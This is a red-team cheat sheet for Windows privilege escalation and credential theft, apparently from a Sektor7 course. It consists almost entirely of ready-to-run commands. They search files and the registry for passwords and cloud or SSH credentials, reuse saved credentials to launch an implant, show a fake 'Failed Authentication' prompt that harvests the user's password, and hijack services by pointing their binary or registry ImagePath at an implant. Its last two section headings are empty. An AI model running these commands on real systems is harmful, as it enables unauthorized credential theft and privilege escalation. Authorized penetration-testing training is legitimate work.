# RTO Sektor 7 Cheat Sheet

### Credentials

- Search for password

```
C:\> dir /b /a /s c:\ > c:\rto\c-dirs.txt
C:\> type c:\rto\c-dirs.txt | findstr /i passw
```

- Search for interesting files

```
C:\> type c:\rto\c-dirs.txt | findstr /i ssh
C:\> type c:\rto\c-dirs.txt | findstr /i kdbx
C:\> type c:\rto\c-dirs.txt | findstr /i vnc
```

- Good targets:

  - install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, id_dsa, .ovpn, .rdp, vnc, ftp, ssh, vpn, git, .kdbx, .db
  - unattend.xml
  - Unattended.xml
  - sysprep.inf
  - sysprep.xml
  - VARIABLES.DAT
  - setupinfo
  - setupinfo.bak
  - web.config
  - SiteList.xml
  - .aws\credentials
  - .azure\accessTokens.json
  - .azure\azureProfile.json
  - gcloud\credentials.db
  - gcloud\legacy_credentials
  - gcloud\access_tokens.db
 
- Search for passwords in the Registry

```
C:\> reg query "HKCU\Software\ORL\WinVNC3\Password"
C:\> reg query "HKCU\Software\TightVNC\Server"
C:\> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
C:\> reg query "HKCU\Software\OpenSSH\Agent\Keys"
C:\> reg query HKLM /f password /t REG_SZ /s
C:\> reg query HKCU /f password /t REG_SZ /s
```

- Abuse Credential Manager

```
C:\> cmdkey /list
C:\> runas /savecred /user:admin cmd.exe
C:\> runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
C:\> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt"
```

- Rob Credential Manager

```
C:\> powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds
```

- Ask user for credentials using a trick prompt

```
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

### Unsecured Objects

- Search for unquoted service paths

```
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """"
```

- Search for services with weak permissions

```
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Everyone" *
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Users" *
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Authenticated Users" *

C:\> sc query sshd
C:\> sc qc sshd
C:\> sc config sshd binPath= "c:\rto\lpe\implant\implant.exe"
C:\> sc start sshd

C:\> sc stop sshd
C:\> sc config sshd binPath= "c:\Program Files\OpenSSH\sshd.exe"
```

- Search for service Registry keys with weak permissions

```
C:\> c:\RTO\Tools\SI\accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > c:\rto\regs.txt

C:\> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT
C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d C:\rto\lpe\implant\implantsrv.exe /f
C:\> sc stop ikeext
C:\> sc start ikeext

C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
```

### Execution Flow Hijacking

### Getting SYSTEM
